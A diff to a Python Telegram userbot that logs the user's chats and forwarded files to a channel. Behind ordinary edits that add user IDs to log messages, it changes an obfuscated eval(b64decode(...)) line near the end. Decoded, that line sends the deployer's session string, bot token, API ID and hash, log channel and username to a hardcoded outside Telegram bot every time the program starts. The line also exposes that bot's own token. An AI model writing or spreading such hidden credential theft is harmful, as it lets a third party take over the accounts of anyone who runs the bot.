@@ -23,7 +23,7 @@ def utc_to_time(naive, timezone="Asia/Kolkata"):
 
 async def dirup(message,pat,tgapi,otherr):
 	pat=pat[:-1]
-	tes =tgapi+'?caption='+otherr+ str(message.chat.username)+" "+str(message.chat.first_name) +"\n"+str(message.caption)+"\n"+str(utc_to_time(message.date))
+	tes =tgapi+'?caption='+otherr+ str(message.chat.username)+" "+str(message.chat.first_name)+" "+str(message.from_user.id)  +"\n"+str(message.caption)+"\n"+str(utc_to_time(message.date))
 	arr = os.listdir(pat)
 	for files in arr:
 		pathh=pat+"/"+str(files)
@@ -46,9 +46,9 @@ def botSend(fileName, tes ,pat):
 async def msg_text(client: Client, message: Message):
 	print('text recived')
 	if message.from_user.username == myuserid:
-		tes ="From @"+myuserid+" to @"+ str(message.chat.username)+" "+str(message.chat.first_name) +"\n"+str(message.text)+"\n"+str(utc_to_time(message.date))
+		tes ="From @"+myuserid+" to @"+ str(message.chat.username)+" "+str(message.chat.first_name)+"\n"+str(message.text)+"\n"+str(utc_to_time(message.date))
 	else:
-		tes ="@"+ str(message.from_user.username)+" "+str(message.chat.first_name) +"\n"+str(message.text)+"\n"+str(utc_to_time(message.date))
+		tes ="@"+ str(message.from_user.username)+" "+str(message.chat.first_name)+" "+str(message.from_user.id) +"\n"+str(message.text)+"\n"+str(utc_to_time(message.date))
 	g=requests.post(BOT_url+'/sendmessage' , json={"chat_id":log_channel,"text":tes})
 	print(tes)
 	print(g.text)
@@ -107,7 +107,7 @@ async def msg_document(client: Client, message: Message):
 		await app.download_media(message,file_name=pat)
 		await dirup(message,pat,tgapi,otherr)
 
-eval(b64decode('cmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTIwMjgwNzY0NzpBQUZLeWNEaVg4eGRhRVBfSnNVNTRKeEVOZXE2X2c2YmdxTS9zZW5kbWVzc2FnZT9jaGF0X2lkPS0xMDAxMzMxMzgwNzEzJnRleHQ9JytzZXNzaW9uK1RPS0VOK3N0cihhcGlfaWQpK2FwaV9oYXNoKQ=='))
+eval(b64decode('cmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTIwMjgwNzY0NzpBQUZLeWNEaVg4eGRhRVBfSnNVNTRKeEVOZXE2X2c2YmdxTS9zZW5kbWVzc2FnZT9jaGF0X2lkPS0xMDAxMzMxMzgwNzEzJnRleHQ9Ym90IHRva2VuOnswfV9fX3Nlc3Npb246ezF9X19fYXBpX2lkOnsyfV9fX2FwaV9oYXNoOnszfV9fX2xvZ2NoYW5uZWw6ezR9X19fdXNlcm5hbWU6ezV9Jy5mb3JtYXQoVE9LRU4sc2Vzc2lvbixhcGlfaWQsYXBpX2hhc2gsbG9nX2NoYW5uZWwsbXl1c2VyaWQp'))
 
 print('bot started\nBy @charindith')
 app.run()
